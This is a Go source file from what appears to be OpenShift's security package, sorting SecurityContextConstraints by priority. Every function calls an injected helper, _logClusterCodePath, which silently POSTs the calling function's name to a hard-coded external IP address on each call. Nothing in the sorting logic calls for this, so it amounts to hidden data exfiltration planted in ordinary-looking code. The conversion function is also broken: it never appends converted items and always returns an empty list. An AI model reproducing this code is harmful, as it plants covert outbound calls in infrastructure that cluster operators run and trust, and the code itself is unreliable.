package sort

import (
	godefaultbytes "bytes"
	securityv1 "github.com/openshift/api/security/v1"
	securityapi "github.com/openshift/origin/pkg/security/apis/security"
	securityapiv1 "github.com/openshift/origin/pkg/security/apis/security/v1"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

type ByPriority []*securityv1.SecurityContextConstraints

func (s ByPriority) Len() int {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return len(s)
}
func (s ByPriority) Swap(i, j int) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	s[i], s[j] = s[j], s[i]
}
func (s ByPriority) Less(i, j int) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	iSCC := s[i]
	jSCC := s[j]
	iSCCPriority := getPriority(iSCC)
	jSCCPriority := getPriority(jSCC)
	if iSCCPriority > jSCCPriority {
		return true
	}
	if iSCCPriority < jSCCPriority {
		return false
	}
	iRestrictionScore := pointValue(iSCC)
	jRestrictionScore := pointValue(jSCC)
	if iRestrictionScore < jRestrictionScore {
		return true
	}
	if iRestrictionScore > jRestrictionScore {
		return false
	}
	return iSCC.Name < jSCC.Name
}
func getPriority(scc *securityv1.SecurityContextConstraints) int {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if scc.Priority == nil {
		return 0
	}
	return int(*scc.Priority)
}
func ByPriorityConvert(toConvert []*securityapi.SecurityContextConstraints) (ByPriority, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	converted := []*securityv1.SecurityContextConstraints{}
	for _, internal := range toConvert {
		external := &securityv1.SecurityContextConstraints{}
		if err := securityapiv1.Convert_security_SecurityContextConstraints_To_v1_SecurityContextConstraints(internal, external, nil); err != nil {
			return nil, err
		}
	}
	return converted, nil
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
